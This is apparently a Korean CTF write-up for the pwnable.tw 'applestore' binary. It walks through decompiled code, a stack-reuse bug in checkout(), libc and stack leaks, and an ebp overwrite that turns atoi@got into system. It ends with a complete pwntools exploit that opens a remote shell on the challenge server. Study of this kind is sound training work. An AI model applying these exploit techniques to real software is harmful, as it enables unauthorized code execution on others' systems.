# [summary]
- stack reusing vulnerability
- reallocating variable space through ebp change


# analysis
```console
m444ndu@ubuntu:~/pwntw/applestore$ checksec applestore 
[*] '/home/m444ndu/pwntw/applestore/applestore'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

바이너리는 아래와 같은 기능들을 가졋슴다.
```console
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
> 
```


## add()
```c
switch ( atoi(&nptr) )
  {
    case 1:
      chunk = (struct _chunk *)create("iPhone 6", 199);
      insert(chunk);
      goto LABEL_8;
    case 2:
      chunk = (struct _chunk *)create("iPhone 6 Plus", 299);
      insert(chunk);
      goto LABEL_8;
    case 3:
      chunk = (struct _chunk *)create("iPad Air 2", 499);
      insert(chunk);
      goto LABEL_8;
    case 4:
      chunk = (struct _chunk *)create("iPad Mini 3", 399);
      insert(chunk);
```
`add()` 함수에서는 제품을 선택한 후, `create()` 함수를 통해 해당 제품에 대한 `chunk`를 생성하고 `insert()`를 통해 제품들의 **double linked list**를 구성합니다. `chunk`는 다음과 같이 생겼습니다.
 ```c
00000000 _chunk          struc ; (sizeof=0x10, mappedto_5)
00000000                                         ; XREF: checkout/r
00000000 string          dd ?                    ; offset
00000004 price           dd ?                    ; XREF: checkout+50/w
00000008 next_chunk      dd ?                    ; offset
0000000C prev_chunk      dd ?                    ; offset
00000010 _chunk          ends
```


## create()
```c
struct _chunk *__cdecl create(char *phone_name, int price)
{
  struct _chunk *v2; // eax
  struct _chunk *v3; // ST1C_4

  v2 = (struct _chunk *)malloc(0x10u);
  v3 = v2;
  v2->price = price;
  asprintf(&v2->string, "%s", phone_name);
  v3->next_chunk = 0;
  v3->prev_chunk = 0;
  return v3;
}
```
`create()` 함수에서는 제품의 이름과 가격을 인자로 넘겨받은 뒤, `chunk`를 생성하여 저장하고 초기화해주는 역할을 합니다.


## insert()
```c
struct _chunk *__cdecl insert(struct _chunk *chunk)
{
  struct _chunk *result; // eax
  struct _chunk *i; // [esp+Ch] [ebp-4h]

  for ( i = (struct _chunk *)&myCart; i->next_chunk; i = i->next_chunk )// 맨 마지막 chunk를 가리키게 함
    ;
  i->next_chunk = chunk;
  result = chunk;
  chunk->prev_chunk = i;                        // i[3] = chunk  새 청크에 이전 청크 주소 저장
  return result;
}
```
`insert()` 함수에서는 우선 `chunk`들의 **double linked list**의 `next_chunk` 만을 이용하여 맨 마지막 `chunk`를 선택한 뒤, 인자로 넘겨받은 새로 추가할 `chunk`의 주소를 마지막 `chunk`의 `next_chunk`에 저장합니다. 인자로 받은 `chunk`의 `prev_chunk`에는 역시 마지막 `chunk`의 주소가 저장됩니다. 


## delete()
```c
  my_read(&nptr, 0x15u);
  select = atoi(&nptr);
  while ( chunk )
  {
    if ( index == select )                      // double linked list
    {
      next_chunk = chunk->next_chunk;
      prev_chunk = chunk->prev_chunk;
      if ( prev_chunk )
        prev_chunk->next_chunk = next_chunk;
      if ( next_chunk )
        next_chunk->prev_chunk = prev_chunk;
      printf("Remove %d:%s from your shopping cart.\n", index, chunk->string);
      return __readgsdword(0x14u) ^ canary;
    }
    ++index;
    chunk = chunk->next_chunk;
```
`delete()` 함수의 경우 입력한 `index`에 맞춰 해당 번째의 `chunk`를 제거하는 역할을 함니다. 이 때, 해당 `chunk`의 `*prev_chunk[2]`에 `next_chunk`를 저장하고, `*next_chunk[3]`에 `prev_chunk`를 저장하는데, **double linked list**에서 `chunk`를 제거하는 것과 비슷한 방식입니다.



## cart()
```c
int cart()
{
  signed int i2; // eax
  signed int i1; // [esp+18h] [ebp-30h]
  int total_price; // [esp+1Ch] [ebp-2Ch]
  struct _chunk *chunk; // [esp+20h] [ebp-28h]
  char buf; // [esp+26h] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  i1 = 1;
  total_price = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(&buf, 0x15u);
  if ( buf == 'y' )
  {
    puts("==== Cart ====");
    for ( chunk = (struct _chunk *)myCart2; chunk; chunk = chunk->next_chunk )
    {
      i2 = i1++;
      printf("%d: %s - $%d\n", i2, chunk->string, chunk->price);
      total_price += chunk->price;
    }
  }
  return total_price;
}
```
`next_chunk`를 계속 타며 `next_chunk`가 0인 `chunk`를 만날 때까지 해당 `chunk`의 `string`과 `price`를 출력해주는 함수입니다.


## checkout()
```c
unsigned int checkout()
{
  int total_price; // [esp+10h] [ebp-28h]
  struct _chunk chunk; // [esp+18h] [ebp-20h]
  unsigned int v3; // [esp+2Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  total_price = cart();
  if ( total_price == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&chunk.string, "%s", "iPhone 8");
    chunk.price = 1;
    insert(&chunk);
    total_price = 7175;
  }
  printf("Total: $%d\n", total_price);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v3;
}
```
해당 함수는 이제까지 카트에 담은 제품들의 가격들을 모두 합친 `total_price` 값이 **7174**가 될 경우 해당 함수의 지역변수 공간을 `chunk`로 할당시켜주는 기능을 갖고 잇습니다. 본 문제의 취약점은 여기에 존재합니다. `chunk`로 스택 공간을 할당받는데, 이 공간은 `handler()` 함수 이 후에 불려지는 함수가 사용할 수 있기 때문에, 할당 받은 해당 `chunk`의 데이터는 계속 수정될 수 있습니다.


먼저 **7174**를 만들어주기 위해, `$199 * 6 + $299 * 20` 만큼 카트에 담고, `checkout()`을 불러줍니다.

다음은 위의 `checkout()`에서 `stack`에 할당받은 `chunk`를 나타냅니다. `insert()` 직후입니다. 처음은 "iPhone 8"이 저장된 주소가 저장되어 있고 차례로 $1 가격이 저장되어 있습니다. `next_chunk` 위치에는 초기화를 해주지 않아 그냥 기존 스택의 주소가 저장되어 있고, `prev_chunk`에는 이전 `chunk`의 주소가 저장되어 있습니다.

```c
pwndbg> x/40wx 0xff9a9878
0xff9a9878:    0x089f5958    0x00000001    0xff9a98b6    0x089f58b8
0xff9a9888:    0x0000000a    0x53319d00    0xf7f75000    0xf7f75000
0xff9a9898:    0xff9a98d8    0x08048c54    0xff9a98b6    0x00000015
```
  
  
다음은 `handler() -> cart()` 함수에서 `my_read()` 직전과 직후의 상황입니다. `cart()` 함수에서 할당받은 `stack chunk`의 공간을 사용하고, `my_read(&buf, 0x15)`로 해당 공간을 덮어쓸 수 있습니다. `buf`의 주소는 `ebp-0x22` 이며 아래의 `0xff9a9876`과 같습니다. 다른 함수들의 입력 변수의 공간이 `ebp-0x22`이므로 `cart()` 함수뿐만 아니라 다른 함수에서도 해당 공간을 덮어쓸 수 있습니다.

```c
(before)
pwndbg> x/20wx 0xff9a9878
0xff9a9878:    0xf7df4c65    0xf7df2060    0xff9a98b6    0x00000000
...

(after)
pwndbg> x/20wx 0xff9a9878
0xff9a9878:    0x0804b00c    0x00000000    0x00000000    0x00000000
0xff9a9888:    0x0000000a
...

pwndbg> x/20wx 0xff9a9878 - 2
0xff9a9876:    0xb00c4179    0x00000804    0x00000000    0x00000000
0xff9a9886:    0x000a0000    0x9d000000    0x00005331    0x50000000
...
```

따라서 `checkout()`으로 하나의 `stack chunk`를 할당한 뒤, `cart()` 함수나 다른 함수들을 이용하여 해당 `chunk`의 데이터를 계속 조작할 수 있습니다. `string` 주소가 위치하는 첫번째 4바이트를 `got`로 덮어 `libc 주소`를 **leak** 할 수 있으며, **leak** 한 `libc의 environ` 값을 통하여 `stack의 주소`를 **leak** 할 수 있습니다.

총 두 번의 `cart()`를 통해 필요한 주소들을 알아낼 수 있습니다.


다음은 `eip`를 컨트롤 해야하는데, 우선 처음으로 든 생각은 `delete()` 함수의 **unlink** 과정을 이용하여 `atoi@got`를 `system` 함수의 주소로 덮는 것이였습니다. 그러나 한 쪽에만 값을 쓰는 것이 아닌, 양 쪽으로 값을 저장하는 것이기 때문에, `libc`에 값을 쓰면서 접근권한 문제로 문제가 생겼습니다.

`ebp` 값을 바꿈으로써 이것을 우회할 수 있는데, 다음과 같습니다. `delete()` 함수 이 후, 다시 `handler()` 함수로 돌아왔을 때 실행하는 명령은 다음과 같습니다.
```c
.text:08048BE4                 mov     dword ptr [esp], offset asc_804904B ; "> "
.text:08048BEB                 call    _printf
.text:08048BF0                 mov     eax, ds:stdout@@GLIBC_2_0
.text:08048BF5                 mov     [esp], eax      ; stream
.text:08048BF8                 call    _fflush
.text:08048BFD                 mov     dword ptr [esp+4], 15h ; nbytes
.text:08048C05                 lea     eax, [ebp+buf]
.text:08048C08                 mov     [esp], eax      ; buf
.text:08048C0B                 call    my_read
.text:08048C10                 lea     eax, [ebp+buf]
.text:08048C13                 mov     [esp], eax      ; nptr
.text:08048C16                 call    _atoi
```

단순히, `esp`를 이용하여 `printf()`를 실행하고, `ebp`를 기준으로 `-0x22`에 값을 입력한 뒤, `atoi()`를 실행합니다. `ebp` 값이 바뀌더라도 `esp` 기준으로 `printf()`를 실행하기 때문에 아무 타격이 없고, `ebp`를 기준으로 값을 입력하기 때문에 원하는 곳에 값을 쓸 수 있습니다.

따라서, `cart()` 함수의 `*ebp` 값을 `atoi@got` 영역 쪽의 주소로 덮는다면, `handler()`의 `my_read()` 실행시 `atoi@got`를 `system` 함수로 덮을 수 있습니다. 또한 인자 역시 입력이 들어가는 주소로 갖기 때문에, `"/bin/sh"`를 인자로 주는 것 역시 가능합니다. 다행히 두 주소 모두 쓰기 가능한 영역이기 때문에 정상적으로 `delete()`를 함으로써 값을 바꿔줄 수 있습니다.


```c
.got.plt:0804B034 off_804B034     dd offset __libc_start_main
.got.plt:0804B034                                         ; DATA XREF: ___libc_start_main↑r
.got.plt:0804B038 off_804B038     dd offset memset        ; DATA XREF: _memset↑r
.got.plt:0804B03C off_804B03C     dd offset asprintf      ; DATA XREF: _asprintf↑r
.got.plt:0804B040 off_804B040     dd offset atoi          ; DATA XREF: _atoi↑r
.got.plt:0804B040 _got_plt        ends
```

# exploit
```python
#! /usr/bin/python
from pwn import *

def add(device):
    r.sendlineafter('> ','2')
    r.sendlineafter('Device Number> ',str(device))

def cart(data=''):
    r.sendlineafter('> ','4')
    r.sendlineafter('ok? (y/n) > ','y'+data)

def checkout(data=''):
    r.sendlineafter('> ','5')
    r.sendlineafter('ok? (y/n) > ','y')

def delete(index):
    r.sendlineafter('> ','3')
    r.sendlineafter('Item Number> ',str(index))


#r = process('./applestore',env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw',10104)
libc = ELF('./libc_32.so.6')
#context.log_level = 'debug'
#gdb.attach(r,'b* 0x8048B9d') # b03


##### allocatte stack #####

for i in range(20):
    add('2') # 299

for i in range(6):
    add('1') # 199

checkout()


##### leak libc_addr #####

payload = 'A' # 'y'+'A' dummy [$ebp+0x22]
payload += p32(0x804b00c) # leak read@got.plt
payload += p32(0x00)      # price
payload += p32(0x00)      # next
payload += p32(0x00)      # previous
cart(payload)

r.recvuntil('27: ')
leak = u32(r.recv(4))
libc_base = leak - 868800
success('libc_base = '+hex(libc_base))

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search('/bin/sh'))
log.info('system_addr = '+hex(system_addr))
log.info('binsh_addr = '+hex(binsh_addr))

environ_addr = libc_base + libc.symbols['environ']
log.info('environ_addr = '+hex(environ_addr))


##### leak stack_addr #####

payload2 = 'A' # 'y'+'A' dummy [$ebp+0x22]
payload2 += p32(environ_addr) # leak stack_addr
payload2 += p32(0x00)         # price
payload2 += p32(0x00)
payload2 += p32(0x00)
cart(payload2)

r.recvuntil('27: ')
leak = u32(r.recv(4))

cart_ebp_addr = leak - 260
target = cart_ebp_addr - 8
success('cart_ebp_addr = '+hex(cart_ebp_addr))


##### ebp overwrite #####

payload3 = '27' # [$ebp+0x22]
payload3 += p32(environ_addr)
payload3 += p32(0x01)
payload3 += p32(0x0804b058) # atoi 0x804b040
payload3 += p32(target)
delete(payload3)


##### atoi@got overwrite #####

payload4 = '\x00'*0x0a
payload4 += p32(system_addr)
payload4 += '1;/bin/sh'
r.sendlineafter('> ',payload4)

r.interactive()

'''
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit

'''
```
